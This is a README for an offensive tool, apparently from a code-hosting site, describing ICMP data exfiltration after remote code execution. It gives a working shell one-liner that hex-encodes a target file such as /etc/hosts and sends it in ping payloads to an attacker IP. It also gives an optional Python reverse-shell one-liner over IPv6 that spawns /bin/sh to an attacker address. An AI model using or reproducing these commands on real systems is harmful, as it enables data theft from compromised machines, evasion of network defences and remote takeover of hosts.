# 📡 ICMP Data Exfiltration via Ping

## 🚀 Overview
This project provides a method for exfiltrating file contents using **ICMP packets** when you have **Remote Code Execution (RCE)** but cannot establish a reverse shell or list directories. It allows you to send file data through **ping requests** and capture it using a sniffer.

## ⚙️ Prerequisites
✅ Root privileges to run the sniffer  
✅ Python3 and Scapy installed on the attacker’s machine  
✅ Target machine must allow outbound ICMP traffic 

## 🛠️ How to Use
#### 1️⃣ Start the Sniffer on the Attacker’s Machine

Run the following command as root:
```bash
sudo python3 icmp_sniffer.py
```

#### 2️⃣ Execute the Payload on the Target Machine

To exfiltrate the contents of /etc/hosts, run:

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attacker_ip>; done
```
- Replace `/etc/hosts` with the file you want to read.
- Replace `<attacker_ip>` with your actual IP address.

#### 3️⃣ Example Output
Below is an example screenshot of the sniffer capturing data sent over ICMP:


#### 🌐 Optional: Reverse Shell over IPv6
If the target supports IPv6, you can establish a reverse shell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:4::1004",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## 📌 Notes
⚠️ This method works if outbound ICMP is allowed.

⚠️ File exfiltration is slow due to small packet sizes.

⚠️ Modify `sniff(iface='tun0', prn=data_parser)` to use the correct interface.


